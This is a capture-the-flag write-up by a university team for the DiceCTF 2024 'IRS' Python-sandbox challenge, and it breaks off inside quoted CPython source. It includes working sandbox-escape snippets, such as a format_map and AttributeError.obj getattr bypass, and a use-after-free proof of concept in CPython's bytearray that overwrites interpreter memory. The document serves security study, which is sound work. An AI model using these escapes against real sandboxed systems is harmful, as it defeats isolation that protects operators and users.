<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>[DiceCTF 2024] IRS</title>
    <link rel="stylesheet" href="/assets/css/styles.css">
    <meta name="image" property="og:image" content="/favicon.png">
    <meta name="description" property="og:description" content="CTF Team at the University of British Columbia">
    <link rel="shortcut icon" type="image/png" href="/favicon.png">
    <link rel="alternate" type="application/atom+xml" href="/feed.xml" title="CTF @ UBC"/>
    <link rel="me" href="https://mastodon.social/@maplebaconctf">
    <link href="https://fonts.googleapis.com/css?family=Inconsolata:700|Overpass+Mono|Lato|Cantarell" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" crossorigin="anonymous">
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" crossorigin="anonymous"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" crossorigin="anonymous"
            onload='renderMathInElement(document.body, {delimiters: [
                    {left: "$$", right: "$$", display: true},
                    {left: "\\(", right: "\\)", display: false},
                    {left: "\\[", right: "\\]", display: true},
                    {left: "$", right: "$", display: false}
            ]});'>
    </script>
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-180688592-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-180688592-1');
    </script>
  </head>
  <body>
    <main>
      <header>
  <nav>
    <a href="/about">About</a>
    <a href="/getting_started">Getting Started</a>
    <a href="/blog">Blog</a>
    <a href="/members">Members</a>
    <a href="/challenge">Challenges</a>
    <!-- <a href="https://ctf.maplebacon.org" >maplectf_2023</a> -->
  </nav>
  <div class="logo">
    <a href="/">
      <img src="/assets/images/logo.svg">
    </a>
  </div>
  <div class="title-container">
    <div class="title"><a href="/teamname"><span>Maple Bacon</span></a></div>
    <div class="subtitle">
      <span>
        CTF Team at the University of British Columbia
      </span>
    </div>
  </div>
</header>

      <div class="content">
        <h1>[DiceCTF 2024] IRS</h1>
<p>
  08 Feb 2024
  
  by <a href="/authors/lydxn/">Lyndon</a> and <a href="/authors/desp/">desp</a>
  <!-- ^^ this jekyll is all on one line so commas format properly -->
</p>
<div class="post">
<h2 id="challenge">Challenge</h2>

<ul>
  <li>Author: kmh</li>
  <li>Solves: 2</li>
</ul>

<blockquote>
  <p><em>The Internal Restrictedpythonexecution Service has established a new automated auditing pipeline. Can you
remain undetected?</em></p>

  <p><code class="language-plaintext highlighter-rouge">nc mc.ax 31337</code></p>
</blockquote>

<p>Attachments:
<a href="https://static.dicega.ng/uploads/d08414a0010847008faece0bc12ec4a746693303c1bffc28960fcbbc96a01d64/irs.c"><code class="language-plaintext highlighter-rouge">irs.c</code></a>
<a href="https://static.dicega.ng/uploads/da7e724dfc3d05e77cc3543ea18600c87a1d64ca13f68ad5b575614bf4453085/irs"><code class="language-plaintext highlighter-rouge">irs</code></a>
<a href="https://static.dicega.ng/uploads/934719eaa4b1598b0a43ebb5ac6ac4244ca6139b0fd5d46cc0f00bef939e8173/audit.py"><code class="language-plaintext highlighter-rouge">audit.py</code></a>
<a href="https://static.dicega.ng/uploads/07dd025e37fcb1a54c99bc7d5d266216b33244737b147e108497dea435095029/build.sh"><code class="language-plaintext highlighter-rouge">build.sh</code></a>
<a href="https://static.dicega.ng/uploads/94c2bf49a136d49ebef810c73dc638bc1f7c02ac3eea3ba2ea347917d6edda50/run.sh"><code class="language-plaintext highlighter-rouge">run.sh</code></a>
<a href="https://static.dicega.ng/uploads/e2f9c5fcdffc03011854d942e891b7a15e3216850713f2006cba442b8072badf/Dockerfile"><code class="language-plaintext highlighter-rouge">Dockerfile</code></a></p>

<h2 id="analysis">Analysis</h2>

<p>We’re presented with the following <code class="language-plaintext highlighter-rouge">audit.py</code> file:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">ast</span>
<span class="kn">import</span> <span class="nn">irs</span>

<span class="n">dangerous</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nb">any</span><span class="p">(</span><span class="n">d</span> <span class="ow">in</span> <span class="n">s</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="p">(</span><span class="s">"__"</span><span class="p">,</span> <span class="s">"attr"</span><span class="p">))</span>
<span class="n">dangerous_attr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">dangerous</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">or</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="nb">dict</span><span class="p">)</span>
<span class="n">dangerous_nodes</span> <span class="o">=</span> <span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="n">Starred</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">GeneratorExp</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Match</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">With</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">AsyncWith</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">keyword</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">AugAssign</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Welcome to the IRS! Enter your code:"</span><span class="p">)</span>
<span class="n">c</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">while</span> <span class="n">l</span> <span class="p">:</span><span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">):</span> <span class="n">c</span> <span class="o">+=</span> <span class="n">l</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
<span class="n">root</span> <span class="o">=</span> <span class="n">ast</span><span class="p">.</span><span class="n">parse</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">ast</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">child</span> <span class="ow">in</span> <span class="n">ast</span><span class="p">.</span><span class="n">iter_child_nodes</span><span class="p">(</span><span class="n">node</span><span class="p">):</span>
        <span class="n">child</span><span class="p">.</span><span class="n">parent</span> <span class="o">=</span> <span class="n">node</span>
<span class="k">if</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="ow">in</span> <span class="n">dangerous_nodes</span> <span class="ow">or</span>
           <span class="nb">type</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="ow">is</span> <span class="n">ast</span><span class="p">.</span><span class="n">Name</span> <span class="ow">and</span> <span class="n">dangerous</span><span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="nb">id</span><span class="p">)</span> <span class="ow">or</span>
           <span class="nb">type</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="ow">is</span> <span class="n">ast</span><span class="p">.</span><span class="n">Attribute</span> <span class="ow">and</span> <span class="n">dangerous_attr</span><span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">attr</span><span class="p">)</span> <span class="ow">or</span>
           <span class="nb">type</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="ow">is</span> <span class="n">ast</span><span class="p">.</span><span class="n">Subscript</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">parent</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">ast</span><span class="p">.</span><span class="n">Delete</span> <span class="ow">or</span>
           <span class="nb">type</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="ow">is</span> <span class="n">ast</span><span class="p">.</span><span class="n">arguments</span> <span class="ow">and</span> <span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">kwarg</span> <span class="ow">or</span> <span class="n">n</span><span class="p">.</span><span class="n">vararg</span><span class="p">)</span>
           <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">ast</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">root</span><span class="p">)):</span>
    <span class="k">del</span> <span class="n">__builtins__</span><span class="p">.</span><span class="n">__loader__</span>
    <span class="k">del</span> <span class="n">__builtins__</span><span class="p">.</span><span class="nb">__import__</span>
    <span class="k">del</span> <span class="n">__builtins__</span><span class="p">.</span><span class="n">__spec__</span>
    <span class="n">irs</span><span class="p">.</span><span class="n">audit</span><span class="p">()</span>
    <span class="k">exec</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="p">{},</span> <span class="p">{})</span>
</code></pre></div></div>

<p>The server accepts a multi-line input through the variable <code class="language-plaintext highlighter-rouge">c</code>, and runs it through a series of checks to
make sure the code isn’t <strong>dangerous</strong>. If all the checks pass, the input is executed as Python code via an
<code class="language-plaintext highlighter-rouge">exec</code>.</p>

<p>In such “pyjail” challenges, the flag is usually stored somewhere on the filesystem, meaning we will likely
need to obtain a shell or file read of some sort.</p>

<p>Analyzing the code further, we find that it uses the <code class="language-plaintext highlighter-rouge">ast</code> module to <strong>ban</strong> the following Python constructs:</p>

<ol>
  <li>Names and attributes containing <code class="language-plaintext highlighter-rouge">__</code> or <code class="language-plaintext highlighter-rouge">attr</code>, meaning we can’t use the <code class="language-plaintext highlighter-rouge">getattr()</code>
 and <code class="language-plaintext highlighter-rouge">setattr()</code> built-ins</li>
  <li>Attributes whose names are found in <code class="language-plaintext highlighter-rouge">dir(dict)</code></li>
  <li><code class="language-plaintext highlighter-rouge">*args</code> and <code class="language-plaintext highlighter-rouge">**kwargs</code> in function parameters</li>
  <li>Starred expressions - <code class="language-plaintext highlighter-rouge">ast.Starred</code>, and keyword arguments - <code class="language-plaintext highlighter-rouge">ast.keyword</code></li>
  <li>Subscript notation - <code class="language-plaintext highlighter-rouge">ast.Subscript</code>, with the exception of <code class="language-plaintext highlighter-rouge">del a[b]</code></li>
  <li>Generator expressions - <code class="language-plaintext highlighter-rouge">ast.GeneratorExp</code></li>
  <li>Match statements - <code class="language-plaintext highlighter-rouge">ast.Match</code></li>
  <li>With statements - <code class="language-plaintext highlighter-rouge">ast.With/ast.AsyncWith</code></li>
  <li>Augmented assignment - <code class="language-plaintext highlighter-rouge">ast.AugAssign</code></li>
</ol>

<p>In addition, the built-ins <code class="language-plaintext highlighter-rouge">__loader__</code>, <code class="language-plaintext highlighter-rouge">__import__</code> and <code class="language-plaintext highlighter-rouge">__spec__</code> are deleted prior to executing the program.</p>

<p>The last thing it does is run the C extension, <code class="language-plaintext highlighter-rouge">irs.audit()</code>. From the <code class="language-plaintext highlighter-rouge">irs.c</code> attachment given, we see that
it adds an <strong>audit hook</strong> which causes the program to terminate upon triggering an
<a href="https://docs.python.org/3/library/audit_events.html">audit event</a>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">audit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">event</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">userData</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">static</span> <span class="kt">int</span> <span class="n">running</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">running</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">running</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">))</span> <span class="n">running</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">PyObject</span><span class="o">*</span> <span class="nf">irs_audit</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">PySys_AddAuditHook</span><span class="p">(</span><span class="n">audit</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">Py_RETURN_NONE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>For some background, audit hooks were first introduced in Python 3.8 to, as quoted by <a href="https://peps.python.org/pep-0578/">PEP 578</a>,
<em>“make actions taken by the Python runtime visible to auditing tools.”</em> It’s intended to be used for logging
applications, but as seen here, it also works as a sandboxing technique (although this is highly
<a href="https://peps.python.org/pep-0578/#why-not-a-sandbox">discouraged</a>).</p>

<h2 id="getting-past-the-audit-hook">Getting past the audit hook</h2>

<p>The first thing we learned is that audit hooks are <em>not a joke</em>. As in, they are a lot harder to bypass than
one might suspect. There are some useful built-ins for jailbreaking, like <code class="language-plaintext highlighter-rouge">breakpoint()</code>, <code class="language-plaintext highlighter-rouge">open()</code> and <code class="language-plaintext highlighter-rouge">exec()</code>, but the audit blocks them all. It also blocks many standard library functions - especially shell functions
like <code class="language-plaintext highlighter-rouge">os.system</code>.</p>

<p>There do exist some potentially dangerous library functions that the audit hook <em>does not</em> detect (such as
<code class="language-plaintext highlighter-rouge">ctypes</code>), but in fact, <code class="language-plaintext highlighter-rouge">import</code>s are audited too! Only modules that have been loaded at runtime
(a.k.a. those in <code class="language-plaintext highlighter-rouge">sys.modules</code>) do not trigger the audit event. We can import stuff like <code class="language-plaintext highlighter-rouge">os</code> and <code class="language-plaintext highlighter-rouge">sys</code>, but
anything useful to get us an RCE is annoyingly out of reach.</p>

<p>Because of this, we initially considered the idea of constructing a custom code object and possibly
<a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">pwning</a> the
process that way, but were immediately disappointed to discover that <code class="language-plaintext highlighter-rouge">code.__new__</code> was banned too.</p>

<p>Despite its unintended usage, audit hooks were surprisingly effective here! Just getting past the audit hook
was a challenge in and of itself.</p>

<h2 id="reading-dict-items">Reading dict() items</h2>

<p>Since it seems pretty challenging, let’s just deal with the audit hook later. If we can at least gain access
the other loaded modules, that should widen the playing field of available functions to exploit.</p>

<p>The <code class="language-plaintext highlighter-rouge">__</code> restriction doesn’t leave us with many options in this regard. The classic <code class="language-plaintext highlighter-rouge">object.__subclasses__()</code>
trick is out, and so are plenty of the other useful dunder attributes. <code class="language-plaintext highlighter-rouge">getattr()</code> lets us read the attribute
dynamically, but we’re not allowed to use a name containing <code class="language-plaintext highlighter-rouge">attr</code>.</p>

<p>Hmmm, well the built-in <em>itself</em> isn’t banned, so what if we just did <code class="language-plaintext highlighter-rouge">globals()['__builtins__']['getattr']</code>?</p>

<p>This bypasses both the <code class="language-plaintext highlighter-rouge">attr</code> and <code class="language-plaintext highlighter-rouge">__</code> checks, but we’re also not allowed to use subscripts. Furthermore, any
attribute whose name coincides with <code class="language-plaintext highlighter-rouge">dir(dict)</code> is blocked, so we can’t even use <code class="language-plaintext highlighter-rouge">.get()</code> or <code class="language-plaintext highlighter-rouge">.pop()</code> to get
around that.</p>

<p>To our knowledge (and somewhat surprisingly!), there was no other way to obtain a dict entry. And banning
<code class="language-plaintext highlighter-rouge">ast.keyword</code> meant we couldn’t do anything tricky like unpacking the dict as a keyword argument:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">attr</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>  <span class="c1"># No ast.arguments either :(
</span>    <span class="k">print</span><span class="p">(</span><span class="n">attr</span><span class="p">)</span>
<span class="n">f</span><span class="p">(</span><span class="o">**</span><span class="nb">globals</span><span class="p">())</span>            <span class="c1"># No ast.keyword
</span></code></pre></div></div>

<h2 id="more-futile-attempts">More futile attempts</h2>

<p>Since the <code class="language-plaintext highlighter-rouge">dict()</code> path led us down a dead end, another idea we had was to abuse the properties of <strong>generator
frames</strong>. Once we had a frame object, we could then use <code class="language-plaintext highlighter-rouge">.f_back</code> to trace it back all the way to the global scope. With some trickery with yield functions to
bypass the <code class="language-plaintext highlighter-rouge">ast.GeneratorExp</code> condition, this seemed promising:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">f</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">x</span><span class="p">,</span> <span class="n">frame</span>
    <span class="n">frame</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">gi_frame</span><span class="p">.</span><span class="n">f_back</span><span class="p">.</span><span class="n">f_back</span>
    <span class="k">yield</span>
<span class="n">x</span> <span class="o">=</span> <span class="n">f</span><span class="p">()</span>
<span class="n">x</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
</code></pre></div></div>

<p>However, when we ran the script, nothing printed out. After some confusion, we realized that the audit
hook probably also banned generator frames! (yep, they
<a href="https://github.com/python/cpython/pull/24182">did</a>).</p>

<p>And well, even if they didn’t, the only useful attributes we can extract from the frame object are <code class="language-plaintext highlighter-rouge">f_code</code>
(which is useless because code objects are banned), <code class="language-plaintext highlighter-rouge">f_builtins</code> (which returns a dict that we can’t access
anyway), and <code class="language-plaintext highlighter-rouge">f_globals</code> (useless for the same reason as <code class="language-plaintext highlighter-rouge">f_builtins</code>).</p>

<p>Now, perhaps we could get some information from understanding why certain things were banned. The suspicious
one was definitely the fact that <code class="language-plaintext highlighter-rouge">del a[b]</code> was allowed - the only case where we could use subscripts.
However, we couldn’t find a use for it given that we can’t actually read the value that’s being deleted.</p>

<p>Another banned item was <code class="language-plaintext highlighter-rouge">ast.Match</code>. This time, we knew that it was because structural pattern matching
could be abused to work as a <code class="language-plaintext highlighter-rouge">getattr()</code>:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nb">object</span><span class="p">:</span>
    <span class="n">case</span> <span class="nb">type</span><span class="p">(</span><span class="n">__subclasses__</span><span class="o">=</span><span class="n">subclasses</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">subclasses</span><span class="p">())</span>
</code></pre></div></div>

<p>It would’ve been cool if the solution was based off this trick, but alas, the author was one step ahead of us.</p>

<h2 id="the-light-at-the-end-of-the-tunnel">The light at the end of the tunnel…?</h2>

<p>Thinking back the generator trick and when we discovered that in Hack.lu CTF 2023’s Safest Eval, and
<a href="https://github.com/advisories/GHSA-wqc8-x2pr-7jqh">the subsequent CVE we got</a> for the unintended solution we used,
we realized there is still another way we can potentially end up with an unusual <code class="language-plaintext highlighter-rouge">getattr</code> method - <code class="language-plaintext highlighter-rouge">string.format</code>.</p>

<p>Around the same time as our CVE, someone else also reported a format string vulnerability to RestrictedPython,
in which attributes can be accessed by executing a format string:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">subclasses</span> <span class="o">=</span> <span class="s">'{0.__subclasses__}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">object</span><span class="p">)</span>
</code></pre></div></div>

<p>Originally, we thought that this is pretty useless for our case since it only allows information disclosure since it only returns the attribute as a <strong>string</strong> rather than the object itself, so we didn’t think much about it either, and continued to find more things to work with.</p>

<p>Digging up basically everything we learnt during the RestrictedPython adventures, we also came across another weird quirk of Python’s, namely the <code class="language-plaintext highlighter-rouge">AttributeError.obj</code> field, which can yield some really interesting results:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">getiter</span><span class="p">(</span><span class="n">seq</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">def</span> <span class="nf">hm</span><span class="p">():</span>
            <span class="k">yield</span> <span class="k">from</span> <span class="n">seq</span>
        <span class="n">g</span> <span class="o">=</span> <span class="n">hm</span><span class="p">()</span>
        <span class="n">g</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
        <span class="n">g</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">AttributeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">e</span><span class="p">.</span><span class="n">obj</span>
</code></pre></div></div>
<p>This gives us an iterator for a sequence, without ever calling <code class="language-plaintext highlighter-rouge">__iter__</code> or the builtin function <code class="language-plaintext highlighter-rouge">iter(seq)</code>. It’s only ever-so-slightly useful for
sandboxes like RestrictedPython which doesn’t even allow for loops if it was not explicitly allowed - we already have all the builtin methods we need,
including <code class="language-plaintext highlighter-rouge">iter</code> in this challenge.</p>

<p>But then <a href="/authors/nneonneo">@nneonneo</a> stepped in, combined them both, and gave us something much more than the sum of its parts:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
    <span class="s">"{__getitem__.xx}"</span><span class="p">.</span><span class="n">format_map</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">dict</span><span class="p">))</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="n">getitem</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">obj</span>

<span class="k">print</span><span class="p">(</span><span class="n">getitem</span><span class="p">({</span><span class="s">"a"</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span> <span class="s">"a"</span><span class="p">))</span>
</code></pre></div></div>
<p>We can finally run <code class="language-plaintext highlighter-rouge">getattr</code> on arbitrary things! This means we can get the <code class="language-plaintext highlighter-rouge">__getitem__</code> method out of dicts without getting blocked, and also
means we can finally access basically everything we might ever need in the Python environment.</p>

<p>But… that’s just the Python environment. Remember how our audit hook lives in the interpreter itself? We can’t use any I/O operations without
triggering the hook, and we also can’t import any of the aforementioned modules that could’ve let us bypass the audit hook restrictions either.
We spent another few trying to see if there is any audit hook escapes within the things given to us that wouldn’t trigger the audit hook, such
as those in the object subclasses path as usual, but nothing popped into our minds.</p>

<p>We were basically back to square one… or so we thought.</p>

<h2 id="falling-to-the-dark-side">Falling to the dark side</h2>

<p>At this point, we were getting <em>desp</em>erate. So we, yes, resorted to our only option left:
<strong>memory corruption</strong>.</p>

<p>One bug in particular, <a href="https://github.com/python/cpython/issues/91153">Issue #91153</a>, was a Use-After-Free
in <code class="language-plaintext highlighter-rouge">bytearray.__index__</code>. The interesting thing about this issue is that it was closed with a fix in 2022,
but it still in fact works on the latest version! We can try out the PoC:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># uaf.py
</span>
<span class="k">class</span> <span class="nc">B</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__index__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">memory</span>
        <span class="n">uaf</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
        <span class="n">memory</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
        <span class="n">uaf</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">56</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span>

<span class="n">uaf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span>
<span class="n">uaf</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="n">B</span><span class="p">()</span>
<span class="n">memory</span><span class="p">[</span><span class="nb">id</span><span class="p">(</span><span class="mi">250</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mi">100</span>
<span class="k">print</span><span class="p">(</span><span class="mi">250</span><span class="p">)</span>
</code></pre></div></div>
<hr />
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3.12 uaf.py
100
</code></pre></div></div>

<p>The expected output is clearly <code class="language-plaintext highlighter-rouge">250</code>, but it outputs <code class="language-plaintext highlighter-rouge">100</code> instead!</p>

<h2 id="uaf-exploit">UAF exploit</h2>

<p>It’s not immediately clear where the bug is, but we can make some reasonable assumptions from looking at the
code. First, the <code class="language-plaintext highlighter-rouge">__index__</code> method behaves a bit like a cast to an integer, meaning it coerces <code class="language-plaintext highlighter-rouge">B()</code> to a
numeric value under certain circumstances (like assigning to a bytearray).</p>

<p>Therefore, the line that sets <code class="language-plaintext highlighter-rouge">uaf[23] = B()</code> actually means <code class="language-plaintext highlighter-rouge">uaf[23] = 1</code>, only the coercion is done <em>during</em>
the assignment. This implies that something is happening between the time <code class="language-plaintext highlighter-rouge">uaf[23]</code> is assigned and the
suspicious <code class="language-plaintext highlighter-rouge">.clear()</code>/<code class="language-plaintext highlighter-rouge">.extend()</code> code is executed, confusing the interpreter somehow.</p>

<p>For a better understanding of how the bug works, we must dig into the CPython source code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Objects/bytearrayobject.c */</span>

<span class="k">static</span> <span class="kt">int</span>
<span class="nf">bytearray_ass_subscript</span><span class="p">(</span><span class="n">PyByteArrayObject</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">index</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">values</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">Py_ssize_t</span> <span class="n">start</span><span class="p">,</span> <span class="n">stop</span><span class="p">,</span> <span class="n">step</span><span class="p">,</span> <span class="n">slicelen</span><span class="p">,</span> <span class="n">needed</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="o">*</span><span class="n">bytes</span><span class="p">;</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="n">PyByteArray_AS_STRING</span><span class="p">(</span><span class="n">self</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">_PyIndex_Check</span><span class="p">(</span><span class="n">index</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">Py_ssize_t</span> <span class="n">i</span> <span class="o">=</span> <span class="n">PyNumber_AsSsize_t</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">PyExc_IndexError</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">PyErr_Occurred</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kt">int</span> <span class="n">ival</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

        <span class="c1">// GH-91153: We need to do this *before* the size check, in case values</span>
        <span class="c1">// has a nasty __index__ method that changes the size of the bytearray:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">values</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">_getbytevalue</span><span class="p">(</span><span class="n">values</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ival</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="n">PyByteArray_GET_SIZE</span><span class="p">(</span><span class="n">self</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">Py_SIZE</span><span class="p">(</span><span class="n">self</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">PyErr_SetString</span><span class="p">(</span><span class="n">PyExc_IndexError</span><span class="p">,</span> <span class="s">"bytearray index out of range"</span><span class="p">);</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">values</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* Fall through to slice assignment */</span>
            <span class="n">start</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
            <span class="n">stop</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">step</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">slicelen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
